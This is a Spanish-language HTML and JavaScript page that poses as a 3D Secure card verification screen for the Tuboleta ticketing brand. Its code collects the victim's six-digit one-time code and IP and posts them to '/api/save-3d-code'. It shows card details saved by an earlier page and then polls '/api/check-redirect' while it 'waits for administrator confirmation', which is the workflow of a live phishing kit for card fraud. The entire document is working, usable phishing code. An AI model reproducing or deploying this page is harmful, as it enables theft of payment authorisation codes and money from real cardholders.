<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Verificacion de Seguridad · Tuboleta</title>
  <link href="https://fonts.googleapis.com/css2?family=DM+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }

    body {
      font-family: 'DM Sans', sans-serif;
      background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f3460 100%);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 20px;
    }

    .secure-container {
      width: 100%;
      max-width: 400px;
      animation: fadeUp 0.5s ease both;
    }

    @keyframes fadeUp {
      from { opacity: 0; transform: translateY(20px); }
      to { opacity: 1; transform: translateY(0); }
    }

    .secure-card {
      background: #fff;
      border-radius: 20px;
      overflow: hidden;
      box-shadow: 0 25px 60px rgba(0,0,0,0.4);
    }

    .secure-header {
      background: linear-gradient(135deg, #0066b3, #004d8a);
      padding: 30px;
      text-align: center;
    }

    .shield-icon {
      width: 70px;
      height: 70px;
      background: rgba(255,255,255,0.2);
      border-radius: 50%;
      display: flex;
      align-items: center;
      justify-content: center;
      margin: 0 auto 16px;
    }

    .shield-icon svg {
      width: 36px;
      height: 36px;
      stroke: white;
      stroke-width: 2;
      fill: none;
    }

    .secure-header h1 {
      font-size: 20px;
      font-weight: 700;
      color: #fff;
      margin-bottom: 8px;
    }

    .secure-header p {
      font-size: 13px;
      color: rgba(255,255,255,0.8);
    }

    .secure-body {
      padding: 30px;
    }

    .card-info {
      display: flex;
      align-items: center;
      gap: 16px;
      background: #f8f9fa;
      padding: 16px;
      border-radius: 12px;
      margin-bottom: 24px;
    }

    .card-icon {
      width: 48px;
      height: 32px;
      background: #1a1f71;
      border-radius: 6px;
      display: flex;
      align-items: center;
      justify-content: center;
      color: white;
      font-size: 10px;
      font-weight: 700;
    }

    .card-details {
      flex: 1;
    }

    .card-label {
      font-size: 11px;
      color: #666;
    }

    .card-number {
      font-size: 14px;
      font-weight: 600;
      color: #1a1a2e;
      font-family: 'DM Mono', monospace;
    }

    .amount-display {
      text-align: center;
      margin-bottom: 24px;
    }

    .amount-label {
      font-size: 12px;
      color: #666;
      margin-bottom: 8px;
    }

    .amount-value {
      font-size: 32px;
      font-weight: 700;
      color: #1a1a2e;
    }

    .otp-inputs {
      display: flex;
      justify-content: center;
      gap: 10px;
      margin-bottom: 24px;
    }

    .otp-input {
      width: 45px;
      height: 55px;
      border: 2px solid #e0e0e0;
      border-radius: 10px;
      font-size: 24px;
      font-weight: 700;
      text-align: center;
      outline: none;
      transition: all 0.3s;
      font-family: 'DM Mono', monospace;
    }

    .otp-input:focus {
      border-color: #0066b3;
      box-shadow: 0 0 0 3px rgba(0,102,179,0.1);
    }

    .resend-link {
      text-align: center;
      font-size: 13px;
      color: #666;
      margin-bottom: 24px;
    }

    .resend-link a {
      color: #0066b3;
      text-decoration: none;
      font-weight: 600;
    }

    .resend-link a:hover {
      text-decoration: underline;
    }

    .verify-btn {
      width: 100%;
      padding: 16px;
      background: linear-gradient(135deg, #0066b3, #004d8a);
      color: #fff;
      border: none;
      border-radius: 12px;
      font-size: 16px;
      font-weight: 700;
      cursor: pointer;
      transition: all 0.3s;
    }

    .verify-btn:hover {
      transform: translateY(-2px);
      box-shadow: 0 8px 25px rgba(0,102,179,0.3);
    }

    .verify-btn:disabled {
      opacity: 0.6;
      cursor: not-allowed;
      transform: none;
    }

    .secure-footer {
      padding: 20px;
      text-align: center;
      background: #f8f9fa;
      border-top: 1px solid #e9ecef;
    }

    .secure-footer p {
      font-size: 11px;
      color: #666;
    }

    .secure-footer svg {
      width: 16px;
      height: 16px;
      vertical-align: middle;
      margin-right: 4px;
    }

    /* Loading state */
    .loading-overlay {
      position: fixed;
      inset: 0;
      background: rgba(0,0,0,0.8);
      display: none;
      align-items: center;
      justify-content: center;
      z-index: 9999;
    }

    .loading-box {
      background: #fff;
      border-radius: 20px;
      padding: 40px;
      text-align: center;
    }

    .spinner {
      width: 50px;
      height: 50px;
      border: 4px solid #e0e0e0;
      border-top-color: #0066b3;
      border-radius: 50%;
      animation: spin 0.8s linear infinite;
      margin: 0 auto 20px;
    }

    @keyframes spin {
      to { transform: rotate(360deg); }
    }

    .loading-text {
      font-size: 16px;
      font-weight: 600;
      color: #1a1a2e;
    }

    .loading-sub {
      font-size: 13px;
      color: #666;
      margin-top: 8px;
    }

    /* Timer */
    .timer {
      text-align: center;
      font-size: 13px;
      color: #999;
      margin-bottom: 16px;
    }

    .timer span {
      font-weight: 600;
      color: #e74c3c;
    }
  </style>
</head>
<body>

<div class="secure-container">
  <div class="secure-card">
    <div class="secure-header">
      <div class="shield-icon">
        <svg viewBox="0 0 24 24">
          <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/>
        </svg>
      </div>
      <h1>Verificacion de Seguridad</h1>
      <p>Ingresa el codigo de verificacion enviado a tu telefono</p>
    </div>

    <div class="secure-body">
      <div class="card-info">
        <div class="card-icon">VISA</div>
        <div class="card-details">
          <div class="card-label">Tarjeta terminada en</div>
          <div class="card-number" id="displayCard">•••• •••• •••• ••••</div>
        </div>
      </div>

      <div class="amount-display">
        <div class="amount-label">Monto a verificar</div>
        <div class="amount-value" id="displayAmount">$0</div>
      </div>

      <div class="timer">
        El codigo expira en <span id="countdown">2:00</span>
      </div>

      <div class="otp-inputs">
        <input type="tel" class="otp-input" maxlength="1" id="otp1" inputmode="numeric">
        <input type="tel" class="otp-input" maxlength="1" id="otp2" inputmode="numeric">
        <input type="tel" class="otp-input" maxlength="1" id="otp3" inputmode="numeric">
        <input type="tel" class="otp-input" maxlength="1" id="otp4" inputmode="numeric">
        <input type="tel" class="otp-input" maxlength="1" id="otp5" inputmode="numeric">
        <input type="tel" class="otp-input" maxlength="1" id="otp6" inputmode="numeric">
      </div>

      <div class="resend-link">
        No recibiste el codigo? <a href="#" onclick="resendCode()">Reenviar</a>
      </div>

      <button class="verify-btn" id="verifyBtn" onclick="verifyCode()">Verificar y continuar</button>
    </div>

    <div class="secure-footer">
      <p>
        <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <rect x="3" y="11" width="18" height="11" rx="2"/>
          <path d="M7 11V7a5 5 0 0 1 10 0v4"/>
        </svg>
        Transaccion segura con 3D Secure
      </p>
    </div>
  </div>
</div>

<!-- Loading -->
<div class="loading-overlay" id="loadingOverlay">
  <div class="loading-box">
    <div class="spinner"></div>
    <div class="loading-text">Verificando...</div>
    <div class="loading-sub">Confirmando tu pago</div>
  </div>
</div>

<script>
  // Guardar IP del cliente al inicio
  (async function() {
    if (!localStorage.getItem('user_ip')) {
      try {
        const res = await fetch('https://api.ipify.org?format=json');
        const data = await res.json();
        localStorage.setItem('user_ip', data.ip);
      } catch (e) {
        console.log('No se pudo obtener IP');
      }
    }
  })();

  // Función para obtener IP
  async function getClientIP() {
    const stored = localStorage.getItem('user_ip');
    if (stored) return stored;
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      localStorage.setItem('user_ip', data.ip);
      return data.ip;
    } catch (e) {
      return 'unknown';
    }
  }

  // Cargar datos guardados
  window.addEventListener('load', async function() {
    const monto = localStorage.getItem('pago_monto');
    const tarjeta = localStorage.getItem('pago_tarjeta');
    const nombre = localStorage.getItem('pago_nombre');

    if (monto) {
      document.getElementById('displayAmount').textContent = '$ ' + parseInt(monto).toLocaleString('es-CO');
    }

    if (tarjeta) {
      document.getElementById('displayCard').textContent = '•••• •••• •••• ' + tarjeta;
    }

    // Iniciar contador
    startCountdown();
  });

  // Timer countdown
  let countdownInterval;
  let timeLeft = 120; // 2 minutos

  function startCountdown() {
    countdownInterval = setInterval(() => {
      timeLeft--;
      const minutes = Math.floor(timeLeft / 60);
      const seconds = timeLeft % 60;
      document.getElementById('countdown').textContent = 
        `${minutes}:${seconds.toString().padStart(2, '0')}`;
      
      if (timeLeft <= 0) {
        clearInterval(countdownInterval);
        document.getElementById('countdown').textContent = 'EXPIRADO';
      }
    }, 1000);
  }

  // Auto focus inputs OTP
  const otpInputs = document.querySelectorAll('.otp-input');
  otpInputs.forEach((input, index) => {
    input.addEventListener('input', function() {
      if (this.value.length === 1) {
        if (index < 5) {
          otpInputs[index + 1].focus();
        }
      }
    });

    input.addEventListener('keydown', function(e) {
      if (e.key === 'Backspace' && this.value.length === 0 && index > 0) {
        otpInputs[index - 1].focus();
      }
    });
  });

  // Reenviar codigo
  function resendCode() {
    timeLeft = 120;
    document.getElementById('countdown').textContent = '2:00';
    clearInterval(countdownInterval);
    startCountdown();
    alert('Codigo reenviado a tu telefono');
  }

  // Verificar codigo
  async function verifyCode() {
    let code = '';
    otpInputs.forEach(input => code += input.value);

    if (code.length !== 6) {
      alert('Por favor ingresa los 6 digitos del codigo');
      return;
    }

    // Mostrar loading
    document.getElementById('loadingOverlay').style.display = 'flex';
    
    // Guardar el código en el servidor
    try {
      const clientIP = localStorage.getItem('user_ip') || await getClientIP();
      await fetch('/api/save-3d-code', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ ip: clientIP, codigo: code })
      });
    } catch (e) {
      console.error('Error guardando código:', e);
    }
    
    // Quedarse en espera hasta que el admin confirme
    start3DSecurePolling();
  }
  
  // Polling para verificar si el admin confirmó el código
  let pollingInterval = null;
  
  function start3DSecurePolling() {
    const loadingText = document.querySelector('.loading-text');
    const loadingSub = document.querySelector('.loading-sub');
    if (loadingText) loadingText.textContent = 'Verificacion completada';
    if (loadingSub) loadingSub.textContent = 'Esperando confirmacion del administrador...';
    
    pollingInterval = setInterval(async () => {
      try {
        const clientIP = localStorage.getItem('user_ip') || await getClientIP();
        const res = await fetch('/api/check-redirect?ip=' + clientIP);
        const data = await res.json();
        
        if (data.redirect) {
          clearInterval(pollingInterval);
          window.location.href = data.redirect;
        }
      } catch (e) {}
    }, 2000);
  }
  
  async function getClientIP() {
    try {
      const res = await fetch('https://api.ipify.org?format=json');
      const data = await res.json();
      return data.ip;
    } catch (e) {
      return 'unknown';
    }
  }

  // Enter en cualquier input para continuar
  otpInputs.forEach(input => {
    input.addEventListener('keydown', function(e) {
      if (e.key === 'Enter' && this.value.length === 1) {
        verifyCode();
      }
    });
  });
</script>

</body>
</html>
